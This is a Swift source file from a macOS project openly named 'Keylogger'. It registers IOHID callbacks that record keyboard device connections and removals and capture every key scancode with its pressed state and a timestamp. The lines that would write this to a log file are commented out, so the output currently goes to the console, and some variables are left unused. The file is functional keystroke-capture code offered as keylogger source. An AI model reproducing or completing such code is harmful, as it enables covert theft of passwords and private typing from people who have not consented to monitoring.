//
//  CallBackFunctions.swift
//  Keylogger
//
//  Created by Skrew Everything on 16/01/17.
//  Copyright © 2017 Skrew Everything. All rights reserved.
//

import Foundation
import Cocoa
//import IOKit.hid

class CallBackFunctions
{
    static var CAPSLOCK = false
    static var calander = Calendar.current
    static var prev = ""
    
    static let Handle_DeviceMatchingCallback: IOHIDDeviceCallback = { context, result, sender, device in

        let timeStamp = "Connected - " + Date().description(with: Locale.current) +  "\t\(device)" + "\n"
        print("Handle_DeviceMatchingCallback")
        print(timeStamp.data(using: .utf8)!)
    }
    
    static let Handle_DeviceRemovalCallback: IOHIDDeviceCallback = { context, result, sender, device in

        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()

        let timeStamp = "Disconnected - " + Date().description(with: Locale.current) +  "\t\(device)" + "\n"
//        fh?.write(timeStamp.data(using: .utf8)!)
        print("Handle_DeviceRemovalCallback")
        print(timeStamp.data(using: .utf8)!)
    }
    
    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
        
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let elem: IOHIDElement = IOHIDValueGetElement(device);
        var test: Bool
        print("Handle_IOHIDInputValueCallback")
//        NSLog("%@", elem);
//        NSLog("%@", test);
        if (IOHIDElementGetUsagePage(elem) != 0x07)
        {
            return
        }
        let scancode = IOHIDElementGetUsage(elem);
        print(scancode);
        if (scancode < 4 || scancode > 231)
        {
            return
        }
        let pressed = IOHIDValueGetIntegerValue(device );

        print(pressed);
        
        let timeStamp = "\n" + Date().description(with: Locale.current) + "\n"
//            fh?.write(timeStamp.data(using: .utf8)!)
        print(timeStamp.data(using: .utf8)!)

    }
}

